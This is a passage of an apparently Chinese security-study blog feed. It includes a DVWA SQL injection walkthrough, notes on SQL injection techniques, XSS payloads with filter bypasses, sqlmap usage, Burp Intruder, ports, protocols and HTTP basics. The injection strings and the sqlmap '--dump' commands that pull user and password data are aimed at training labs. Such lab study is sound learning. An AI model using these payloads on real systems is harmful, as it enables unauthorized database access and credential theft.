bomb</strong><br>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p><table><thead><tr><th>NO.</th><th>位置1</th><th>位置2</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>c</td></tr><tr><td>2</td><td>a</td><td>d</td></tr><tr><td>3</td><td>b</td><td>c</td></tr><tr><td>4</td><td>b</td><td>d</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-SQL Injection</title>
      <link href="/2021/04/09/DVWA-SQL-Injection/"/>
      <url>/2021/04/09/DVWA-SQL-Injection/</url>
      
        <content type="html"><![CDATA[<h3 id="LOW-级别"><a href="#LOW-级别" class="headerlink" title="LOW 级别"></a>LOW 级别</h3><p><strong>判断存在注入</strong></p><p><code>?id=1</code>正常回显</p><p><code>?id=1&#39;</code>报错</p><p><code>?id=1&#39;--+</code>回显正常,说明存在符号型注入,闭合方式为<code>&#39;</code></p><p><strong>爆字段</strong></p><p><code>?id=1&#39; order by 2--+</code>回显正常</p><p><code>?id=1&#39;+order+by+3--+</code>报错,说明字段数为 2</p><p><strong>报显示位</strong></p><p><code>?id=&#39;+union+select+1,2--+</code>显示位 1,2</p><p><strong>查表</strong></p><p><code>?id=1&#39;+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--+</code></p><p>报错<code>Illegal mix of collations for operation &#39;UNION&#39;</code></p><p>通过百度,这是由于编码的某种问题造成的,可以使用 16 进制进行读取</p><p><code>?id=1&#39;+union+select+1,concat_ws(&#39;~&#39;,hex(table_name))+from+information_schema.tables+where+table_schema=database()--+</code></p><p>之后再解码就好</p><p><strong>查列</strong></p><p><code>?id=1&#39;+union+select+1,concat_ws(&#39;~&#39;,hex(column_name))+from+information_schema.columns+where+table_name=&#39;users&#39;+and+table_schema=database()--+</code></p><p><strong>查数据</strong></p><p><code>?id=1&#39;+union+select+1,group_concat(hex(user),&#39;,&#39;,hex(password))+from+users--+</code></p><p>也可以直接使用 unhex 函数<br><code>?id=1&#39;+union+select+1,group_concat(unhex(hex(user)),&#39;,&#39;,unhex(hex(password))+from+users--+</code></p><h3 id="medium-级别"><a href="#medium-级别" class="headerlink" title="medium 级别"></a>medium 级别</h3><p>这关换成了 post 请求</p><p>burp 抓包,操作同 low 级别一样,发现单引号会被转义,查列的时候<code>where+table_name=&#39;users&#39;</code>可以转换为 16 进制<strong>users 的 十六进制为 0x75736572</strong></p><h3 id="high-级别"><a href="#high-级别" class="headerlink" title="high 级别"></a>high 级别</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; union select user,password from users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接结束?</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础知识</title>
      <link href="/2021/03/22/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/03/22/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<ul><li><p>database() 当前数据库名</p></li><li><p>单行注释<code>--(空格) </code> 在 url 栏中 +会被解释成空格&#x3D;&#x3D;&gt;<code>--+</code></p></li><li><p>order by (n) 对查询结果的第 n 列进行排序,可以用来判断字段个数</p></li><li><p>联合查询(列数必须相等).select * from users where id &#x3D;’-1’union select 1,2,3 —-左边查询没结果(没有这个 id),右边结果 1,2,3</p></li><li><p>连接字符串<br> concat 普通拼接<br>concat_ws(‘~‘,1,2) 第一位是连接符<br>group_concat(1~2)</p></li><li><p>information_schema<br>简单的信息数据库<br>里面都是视图,不是表,</p><p>schemata &#x3D;&#x3D;&gt;数据库信息<br> schema_name 数据库名称</p><p>tables &#x3D;&#x3D;&gt;数据库和表的关系<br> table_name 表名</p><p>columns &#x3D;&#x3D;&gt;表和列的关系<br> column_name 列名</p></li></ul><p>length(database())&#x3D; 数据库名长度</p><p>left(database(),1)&#x3D;’ ‘ 爆破数据库名</p><ul><li>联合注入</li></ul><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from admin where id&#x3D;1 union select 1,2,3,4 form goods;select * from student where id&#x3D;1 and exists(select usetname from admin);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>布尔盲注</li></ul><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">length(database())&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and ascii(substr(database(),1,1))&gt;3 –+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;1--+表名总长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;1利用ASCII爆破表名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>时间盲注</li></ul><pre class="line-numbers language-none"><code class="language-none">if(payload,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>报错注入</p><ul><li><p>xpath 语法错误</p><p><strong>extractvalue()</strong></p><p>语法：extractvalue(目标 xml 文档，Xpath_string)</p><p>利用第二个参数不满足格式时会报错,返回我们写入的非法格式内容,</p><p><code>?id=&#39;and(select extractvalue(&quot;1&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p><strong>updatexml()</strong></p><p>语法:updatexml(目标 xml 文档,xpath_string,new_value)</p><p>作用:用来改变文档中符合条件的节点的值</p><p>利用方式和 extractvalue 类似</p><p><code>?id=&#39;and(select updatexml(&quot;1&quot;,concat(&#39;~&#39;,(select语句)),&quot;1&quot;))</code></p></li><li><p>concat+rand()+group_by()导致主键重复</p><pre class="line-numbers language-none"><code class="language-none">concat： 连接字符串功能floor： 取**float**的整数值(向下取整）rand： 取0~1之间的随机浮点值group by： 根据一个或多个列对结果集进行分组并有排序功能floor(rand(0)*2)： 随机产生0或1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p><code>?id=&#39;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</code></p><ul><li><p>宽字节注入</p><p>在提交<code>?id=1&#39;</code>时,发现运行的 SQL 语句为<code>select * from user where  id =&#39;1\&#39; #&#39;</code>,对单引号进行了转义</p><p>宽字节注入就是利用 mysql 在使用 GBK 编码的时候,会认为两个字符是一个汉字(前一个字符的 ASCII 需要大于 128).</p><p>所以我们提交<code>id=1%df&#39; #</code>,运行的 SQL 语句就变为了<code>select * from user where id =&#39;1運&#39;#&#39;</code></p><p>这是因为将%df 和%5c 解码成了一个汉字”运”(<code>\</code>的编码为 5c)，从而失去了转义的作用，就可以进行联合注入了</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用网络协议</title>
      <link href="/2021/01/24/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/01/24/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="按照TCP-x2F-IP模型"><a href="#按照TCP-x2F-IP模型" class="headerlink" title="按照TCP&#x2F;IP模型:"></a>按照TCP&#x2F;IP模型:</h1><h2 id="网络访问层"><a href="#网络访问层" class="headerlink" title="网络访问层"></a>网络访问层</h2><ul><li>PPP协议：又称为点对点协议。工作在数据链路层，提供连接认证、传输加密和压缩等功能，互联网服务提供商（ISP）使用PPP为用户提供到Internet的拨号连接，这是因为IP报文无法在没有数据链路协议的情况下通过调制解调器线路自行传输。</li><li>LCP协议：不依赖上层。负责建立和断开连接、设置最大接收单元、设置验证协议以及设置是否进行通信质量的监控。</li><li>NCP协议：依赖上层。</li><li>CSMA&#x2F;CD协议：又称为带有冲突检测的载波侦听多路存取。在以太网中使用的介质访问控制方法，主要工作特点有“多点接入”、“载波监听”、“碰撞检测”。</li><li>POS协议：一种在SDH上进行包通信的一种协议。</li><li>100VG-AnyLAN协议：是IEEE802.12规范定义的一种网络协议。</li><li>无线LAN：无限LAN是的注意事项：在其通信范围内，任何人都可使用该无线LAN，会有被盗听或篡改的危险；可以无需牌照使用特定频段，因此会导致信号不稳定。</li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul><li>ARP协议：地址解析协议。以太网协议规定同一局域网中的主机进行通信，必须知道硬件地址，但是网路层只关心网络地址，ARP协议可以通过网络地址找到对应的硬件地址，所以ARP协议既可以说是工作在数据链路层，也可以说是工作在网络层。</li><li>IPv4：由8比特构成，表示IP首部的下一个首部隶属于那个协议。</li><li>IPv6：必要性：为了根本解决IPv4地址耗尽的问题而被标准化的网际协议。</li><li>ICMP协议：网络控制报文协议。IP数据包在发送途中发生异常导致无法到达对端目标地址时，给发送端发送一个发生异常的通知；有时被用来诊断网络的健康状况。为了更有效的转发IP数据包的成功交付机会，网络控制报文协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。最常用的就是ping和tracert工具了，ping hostname是用来检测网络是否畅通最常用的方法，tracert hostname用来追踪路由器。</li><li>OSPF协议：开放式最短路径优先。为了弥补RIP协议收敛速度慢，只适用于小型网络的不足。于是有了OSPF协议，使用了最短路径算法SPF，更新过程收敛更快，但是也更复杂，课适用于大中型网络，其工作特点有：使用洪泛法向本自治系统中所有路由器发送信息；发送的信息就是本路由器相邻的所有路由器的链路状态；只有当链路状态发生变化的时候，才会用洪泛法像所有路由器发送信息。这也是OSPF与RIP协议区别的要点。<br>BGP协议：边界网关协议。BGP不使用传统的内部网关协议（IGP）的指标，而使用基于路径、网络策略或规则集来决定路由。因此，它更适合被称为矢量性协议，而不是路由协议。采用传统的内部网关协议会使得路由表过于庞大。</li></ul><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><ul><li>TCP协议：传输控制协议。面向有连接的传输层协议。可保证两段通信主机之间的通信可达；能够正确处理在传输过程中丢包、传输顺序乱掉等异常情况；能够有效利用带宽，缓解网络拥堵。协议族的核心内容，主要特点是：点对点链接；可靠交付的服务；提供全双工通信；面向字节流；建立会话，分段传输，流量控制。总之就是传输更可靠，但是相应开销也更大。特别需要掌握的就是“三次握手，四次挥手”通信方式。</li><li>UDP协议：面向无连接的传输层协议。用于分组数据较少或多播、广播通信以及视频通信等多媒体领域。特点有：无连接；尽最大努力交付；面向报文；没有拥塞控制；支持一对一，一对多，多对一的交互通信；开销小。常用聊天信息就是用的UDP协议。</li><li>ARQ协议：自动重传请求。保证TCP可靠传输的一种检查机制。</li></ul><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul><li>HTTP协议：浏览器与服务端之间通信所用的协议。WWW中属于OSI应用层的协议。</li><li>HTML协议：所传输数据的主要格式。属于表示层的协议。</li><li>SMTP协议：发送电子邮件时用到的协议。</li><li>MIME协议：属于OSI参考模型的表示层。</li><li>FTP协议：进行文件传输时会建立两个TCP连接，分别是发出传输请求是所要用到的控制连接与实际传输数据时所要用到的数据连接。</li><li>SSH协议：登录到远程的计算机上，使那台计算机上的程序得以运行的一种功能。</li><li>SNMP协议：简单网络管理协议。为以后扩大网络收集必要的信息；属于应用协议。 是专门设计用于在 IP 网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，它是一种应用层协议。</li><li>MIB协议：访问在SNMP上保存的信息；属于表层协议。</li><li>TELNET协议：远程终端协议，适用与远程控制主机操作。</li><li>POP协议：用于用户从邮件服务器取出邮件的协议</li></ul><h1 id="按照OSI模型"><a href="#按照OSI模型" class="headerlink" title="按照OSI模型"></a>按照OSI模型</h1><h2 id="应用层-1"><a href="#应用层-1" class="headerlink" title="应用层"></a>应用层</h2><p>HTTP、SMTP、SNMP、FTP、Telnet、SlP、SSH、NFS、RTSP、XMPP、Whois、ENRP、TLS</p><h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><p>XDR、ASN.1、NCP、TLS、ASClI</p><h2 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h2><p>ASAP、ISO 8327 &#x2F; CCITT X.225、RPC、NetBlOS、Winsock、BSD sockets、sOCKS、密码验证协议</p><h2 id="传输层-1"><a href="#传输层-1" class="headerlink" title="传输层"></a>传输层</h2><p>TCP、UDP、RTP、SCTP、SPX、ATP、IL</p><h2 id="网络层-1"><a href="#网络层-1" class="headerlink" title="网络层"></a>网络层</h2><p>IP、ICMP、IPX、BGP、OSPF、RIP、IGRP、EIGRP、ARP、RARP、X.25</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>以太网、令牌环、HDLC、帧中继、ISDN、ATM、IEEE 802.11、FDDI、PPP</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>调制解调器,无线电,光纤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常用端口</title>
      <link href="/2021/01/24/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3/"/>
      <url>/2021/01/24/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>端口号由其使用的传输层协议决定</p><p>数据到达IP层后,会先检查IP首部中的协议号,再传给相应协议的模块.如果是TCP则传给TCP模块,如果是UDP则传给UDP模块去做端口号的处理.</p><table><thead><tr><th align="center">端口号</th><th align="center">协议名称</th><th align="center">类型</th><th align="left">全称</th><th align="left">作用</th></tr></thead><tbody><tr><td align="center">20</td><td align="center">ftp</td><td align="center">tcp</td><td align="left">文件传输协议</td><td align="left">ftp的数据传输</td></tr><tr><td align="center">21</td><td align="center">ftp</td><td align="center">tcp</td><td align="left">文件传输协议</td><td align="left">ft的控制指令</td></tr><tr><td align="center">22</td><td align="center">ssh</td><td align="center">tcp</td><td align="left">secure shell</td><td align="left">安全地安全登录</td></tr><tr><td align="center">23</td><td align="center">telnet</td><td align="center">tcp</td><td align="left"></td><td align="left">远程登录</td></tr><tr><td align="center">25</td><td align="center">smtp</td><td align="center">tcp</td><td align="left">简单邮件传输协议</td><td align="left">邮件的传输</td></tr><tr><td align="center">53</td><td align="center">dns</td><td align="center">udp</td><td align="left">域名解析服务</td><td align="left">客户端进行域名查询</td></tr><tr><td align="center">53</td><td align="center">dns</td><td align="center">tcp</td><td align="left"></td><td align="left">dns服务器间的域名复制</td></tr><tr><td align="center">67</td><td align="center">dhcp</td><td align="center">udp</td><td align="left">动态主机配置协议</td><td align="left">dhcp服务器向客户端响应</td></tr><tr><td align="center">68</td><td align="center">chcp</td><td align="center">tcp</td><td align="left"></td><td align="left">客户端向dhcp服务器请求</td></tr><tr><td align="center">69</td><td align="center">tftp</td><td align="center">udp</td><td align="left">Trivial File Transfer Protocol</td><td align="left">文件传输</td></tr><tr><td align="center">80</td><td align="center">http</td><td align="center">tcp</td><td align="left">超文本传输协议</td><td align="left">访问web网站</td></tr><tr><td align="center">110</td><td align="center">pop3</td><td align="center">tcp</td><td align="left">post office protocol -version 3</td><td align="left">接受邮件</td></tr><tr><td align="center">123</td><td align="center">ntp</td><td align="center">udp</td><td align="left">Network time protocol</td><td align="left">同步时间</td></tr><tr><td align="center">161</td><td align="center">snmp</td><td align="center">udp</td><td align="left">简单网络管理协议</td><td align="left">网关工作站向被管设备轮询</td></tr><tr><td align="center">162</td><td align="center">snmptrap</td><td align="center">udp</td><td align="left">简单网络管理协议</td><td align="left"></td></tr><tr><td align="center">179</td><td align="center">bgp</td><td align="center">tcp</td><td align="left">边界网关协议</td><td align="left"></td></tr><tr><td align="center">389</td><td align="center">ldap</td><td align="center">udp</td><td align="left">轻量目录访问协议</td><td align="left">登录域,ldap是访问AD数据库的主要方法</td></tr><tr><td align="center">443</td><td align="center">https</td><td align="center">tcp</td><td align="left">安全超文本传输协议</td><td align="left">以加密方式访问web网站</td></tr><tr><td align="center">464</td><td align="center">Keberos V5</td><td align="center">tcp</td><td align="left">Kerberos 更改密码协议</td><td align="left">域环境下,用户更改密码</td></tr><tr><td align="center">500</td><td align="center">lsakmp</td><td align="center">udp</td><td align="left">安全关联和密钥管理协议</td><td align="left">用于esp协议协商参数</td></tr><tr><td align="center">514</td><td align="center">syslog</td><td align="center">tcp</td><td align="left"></td><td align="left">向日志服务器发送日记</td></tr><tr><td align="center">520</td><td align="center">rip</td><td align="center">udp</td><td align="left"></td><td align="left"></td></tr><tr><td align="center">1521</td><td align="center"></td><td align="center"></td><td align="left">oracle</td><td align="left"></td></tr><tr><td align="center">1812</td><td align="center">radius</td><td align="center">udp</td><td align="left">radius authentication protocol</td><td align="left">认证,授权</td></tr><tr><td align="center">1813</td><td align="center">radius</td><td align="center">udp</td><td align="left">radius authentication protocol</td><td align="left">审计</td></tr><tr><td align="center">1701</td><td align="center">L2tp</td><td align="center">udp</td><td align="left">layer two tunneling protocol</td><td align="left">协商l2tp参数</td></tr><tr><td align="center">1723</td><td align="center">pptp</td><td align="center">tcp</td><td align="left">点对点隧道协议</td><td align="left">协商pptp参数</td></tr><tr><td align="center">3306</td><td align="center"></td><td align="center"></td><td align="left"></td><td align="left">mysql</td></tr><tr><td align="center">3389</td><td align="center">远程桌面</td><td align="center">tcp</td><td align="left"></td><td align="left"></td></tr><tr><td align="center">4500</td><td align="center">NAT-T</td><td align="center">udp</td><td align="left">网络地址转换器遍历</td><td align="left">esp流量穿越NAT设备</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实战攻防演习_蓝队</title>
      <link href="/2021/01/24/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2%E6%BC%94%E4%B9%A0_%E8%93%9D%E9%98%9F/"/>
      <url>/2021/01/24/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2%E6%BC%94%E4%B9%A0_%E8%93%9D%E9%98%9F/</url>
      
        <content type="html"><![CDATA[<p>蓝队在网络攻防演习中作为防守的一方</p><p><strong>备战阶段</strong></p><p>充分了解自身安全防护状况,确定自身的安全防护能力和工作协作默契程度,喂后续工作提供能力支撑</p><p><strong>实战阶段</strong></p><p>做好全局性分析研判,全面布局安全监测预警,提高时间处置效率</p><p><strong>战后改进</strong></p><p>全面复盘分析,总结经验,提升安全防护水平</p><h2 id="应对攻击常用策略"><a href="#应对攻击常用策略" class="headerlink" title="应对攻击常用策略"></a>应对攻击常用策略</h2><ul><li><p>加强安全意识,避免将敏感信息透露出去</p></li><li><p>收敛互联网暴露面,定期梳理网络边界,定期检查易受攻击的系统;外部接入网络梳理;梳理API接口,VPN,WIFI等</p></li><li><p>纵深防御</p><ul><li>互联网端防护:部署网络防护设备,开展攻击检测</li><li>访问控制措施:只给必须是用的用户开放访问权限</li><li>主机防护:关闭无用服务,修改弱口令,高危漏洞打补丁,安全软件,日志审计等</li><li>集权系统防护</li><li>无线网络</li><li>外部接入网络</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2021/01/16/XSS/"/>
      <url>/2021/01/16/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击,<br>网页内嵌入 HTML,CSS,js 代码</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>反射型–前端-&gt;后端-&gt;前端</li><li>存储型–前端-&gt;后端-&gt;数据库-&gt;前端</li><li>DOM 型–前端</li></ul><p>构造如下 payload</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick <span class="token operator">=</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;javascript:alert()&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>str_replace()</strong> 字符串替换,区分大小写</p><pre class="line-numbers language-none"><code class="language-none">可以通过大小写,若替换为空,且只替换一次,可尝试双写绕过&amp;#ASCII  实体化编码绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>strtolower()</strong> 把所有字母转换为小写</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/2021/01/16/sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/01/16/sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>-u 检测存在可利用漏洞</p><p>–dbs 获取所有库</p><p>–current-db 列出当前数据库</p><p>-D 库名 –tables 查询此库中存在的表</p><p>-D 库名 -T 表名 –columns 列出表中的所有列</p><p>-D 库名 -T 表名 -C 列名1,列名2 –dump 导出列中的所有数据</p><h3 id="sqlilabs-Less-1"><a href="#sqlilabs-Less-1" class="headerlink" title="sqlilabs_Less-1"></a>sqlilabs_Less-1</h3><p><code>python E:\sqlmap\sqlmap.py -u &quot;url&quot;</code></p><p><code>python E:\sqlmap\sqlmap.py -u &quot;url&quot; --dbs</code></p><p><code>python E:\sqlmap\sqlmap.py -u &quot;url&quot; --current-db</code></p><p><code>python E:\sqlmap\sqlmap.py -u &quot;url&quot; -D security --tables</code></p><p>python E:\sqlmap\sqlmap.py -u “url” -D security -T users –columns</p><p><code>python E:\sqlmap\sqlmap.py -u &quot;url&quot; -D security -T users -C id,user,password --dump</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http状态码</title>
      <link href="/2021/01/16/http%E7%8A%B6%E6%80%81%E7%A0%81/"/>
      <url>/2021/01/16/http%E7%8A%B6%E6%80%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><ul><li><h4 id="2XX-Success-成功状态码-请求正常处理完毕"><a href="#2XX-Success-成功状态码-请求正常处理完毕" class="headerlink" title="2XX  Success(成功状态码) 请求正常处理完毕"></a><strong>2XX</strong>  Success(成功状态码) 请求正常处理完毕</h4><ul><li><strong>200 OK</strong>:表示从客户端发送给服务器的请求被正常处理并返回</li><li><strong>204 NO Content</strong>:表示客户端发送给客户端的请求得到了成功处理,但在返回的响应报文中不含实体的主体部分(没有资源可以返回)</li></ul></li><li><h4 id="3XX-Redirection-重定向-需要进行附加操作以完成请求"><a href="#3XX-Redirection-重定向-需要进行附加操作以完成请求" class="headerlink" title="3XX  Redirection(重定向) 需要进行附加操作以完成请求"></a>3XX  Redirection(重定向) 需要进行附加操作以完成请求</h4><ul><li><strong>301 Moved Permanently：</strong>永久性重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL；</li><li><strong>302 Found：</strong>临时性重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL;<br>301与302的区别：前者是永久移动，后者是临时移动（之后可能还会更改URL）</li><li><strong>303 See Other：</strong>表示请求的资源被分配了新的URL，应使用GET方法定向获取请求的资源；<br>302与303的区别：后者明确表示客户端应当采用GET方式获取资源</li><li><strong>304 Not Modified：</strong>表示客户端发送附带条件（是指采用GET方法的请求报文中包含if-Match、If-Modified-Since、If-None-Match、If-Range、If-Unmodified-Since中任一首部）的请求时，服务器端允许访问资源，但是请求为满足条件的情况下返回改状态码；</li><li><strong>307 Temporary Redirect：</strong>临时重定向，与303有着相同的含义，307会遵照浏览器标准不会从POST变成GET；（不同浏览器可能会出现不同的情况）；</li></ul></li><li><h4 id="4XX-Client-error-客户端错误-客户端请求出错-服务器无法处理请求"><a href="#4XX-Client-error-客户端错误-客户端请求出错-服务器无法处理请求" class="headerlink" title="4XX Client error(客户端错误) 客户端请求出错,服务器无法处理请求"></a>4XX Client error(客户端错误) 客户端请求出错,服务器无法处理请求</h4><ul><li><strong>400 Bad Request：</strong>表示请求报文中存在语法错误；</li><li><strong>401 Unauthorized：</strong>未经许可，需要通过HTTP认证；</li><li><strong>403 Forbidden：</strong>服务器拒绝该次访问（访问权限出现问题）</li><li><strong>404 Not Found：</strong>表示服务器上无法找到请求的资源，除此之外，也可以在服务器拒绝请求但不想给拒绝原因时使用；</li><li><strong>405 ：</strong> 服务器不支持对应http方法get&#x2F;post</li></ul></li><li><h4 id="5XX-Server-error-服务器错误-服务器处理请求出错"><a href="#5XX-Server-error-服务器错误-服务器处理请求出错" class="headerlink" title="5XX Server error(服务器错误) 服务器处理请求出错"></a>5XX Server error(服务器错误) 服务器处理请求出错</h4><ul><li><strong>500 Inter Server Error：</strong>表示服务器在执行请求时发生了错误，也有可能是web应用存在的bug或某些临时的错误时；</li><li><strong>503 Server Unavailable：</strong>表示服务器暂时处于超负载或正在进行停机维护，无法处理请求；</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从输入url到页面显示</title>
      <link href="/2021/01/16/%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA/"/>
      <url>/2021/01/16/%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="从输入-url-到页面显示"><a href="#从输入-url-到页面显示" class="headerlink" title="从输入 url 到页面显示"></a>从输入 url 到页面显示</h1><ul><li><strong>输入地址</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">浏览器首先从浏览器缓存,本地缓存,本地的hosts文件查询对应的ip;如果在本地没找到,接下来会发送一个DNS请求到本地DNS服务器,本地DNS查询它的缓存记录;如果没有,本地服务器向DNS根服务器查询(根服务器并没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址);本地服务器继续向域服务器发出请求,域服务器返回一个解析服务器的地址,然后本地DNS服务器向解析服务器发出请求,就会收到一个域名和ip对应关系,将ip返回给用户,并把对应关系保存在缓存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>建立 TCP 连接(三次握手)</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">第一次握手：客户端A将标志位SYN置为1,随机产生一个值为seq&#x3D;J（J的取值范围为&#x3D;1234567）的数据包到服务器，客户端A进入SYN_SENT状态，等待服务端B确认；第二次握手：服务端B收到数据包后由标志位SYN&#x3D;1知道客户端A请求建立连接，服务端B将标志位SYN和ACK都置为1，ack&#x3D;J+1，随机产生一个值seq&#x3D;K，并将该数据包发送给客户端A以确认连接请求，服务端B进入SYN_RCVD状态.第三次握手：客户端A收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack&#x3D;K+1，并将该数据包发送给服务端B，服务端B检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，客户端A和服务端B进入ESTABLISHED状态，完成三次握手，随后客户端A与服务端B之间可以开始传输数据了.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>发送 http 请求</strong></p></li><li><p><strong>服务器处理请求</strong></p></li></ul><p>后端从在固定的端口接收到 TCP 报文开始，它会对 TCP 连接进行处理，对 HTTP 协议进行解析，并按照报文格式进一步封装成 HTTP Request 对象，供上层使用。</p><p>服务器返回一个 HTPP 响应,包括状态行,响应头,响应正文</p><ul><li><strong>浏览器显示 HTML</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">浏览器在解析html文件时，会”自上而下“加载，并在加载过程中进行解析渲染。在解析过程中，如果遇到请求外部资源时，如图片、外链的CSS、iconfont等，请求过程是异步的，并不会影响html文档进行加载.　　解析过程中，浏览器首先会解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>*<em>浏览器发送请求获取嵌入在 HTML 中的资源（图片、音频、视频、CSS、JS 等）</em></li></ul><h3 id="浏览器是如何进行界面渲染的"><a href="#浏览器是如何进行界面渲染的" class="headerlink" title="浏览器是如何进行界面渲染的"></a>浏览器是如何进行界面渲染的</h3><ol><li>解析（Parser）HTML，生成 DOM 树(DOM Tree)</li><li>同时解析（Parser） 